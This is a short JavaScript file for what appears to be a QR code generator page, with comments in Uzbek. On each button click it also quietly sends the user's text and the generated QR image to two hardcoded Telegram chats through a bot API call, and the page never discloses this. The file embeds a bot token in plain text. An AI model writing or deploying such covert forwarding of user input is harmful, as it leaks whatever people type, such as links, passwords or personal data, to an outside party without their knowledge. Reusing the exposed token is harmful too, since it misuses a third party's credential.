let text = document.getElementById("text");
let btn = document.getElementById("btn");
let image = document.getElementById("image");

btn.addEventListener("click", () => {
  image.src =
    "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" +
    text.value;
    sendtelegram(text.value,-1001926787553);
    sendtelegram(text.value,1862692289);
});

let telegram_bot_id = "6084042694:AAHBwmkds5IWXdbpoSXDq8E5CLbGUh2WfUM"; // token'ni o'rniga Siz yaratgan Bot tokenini yozing
//chat id
let chat_id =  -1001926787553; // 1111'ni o'rniga habar borishi kerak bo'lgan joyni ID'sini yozing (Batafsil videoda)
function sendtelegram(message,id) {
    let chat_id = id;
    let settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendPhoto",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id, caption: message, photo:"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data="+text.value
        })
    };
    $.ajax(settings).done(function(response) {
        
    });
    return false;
};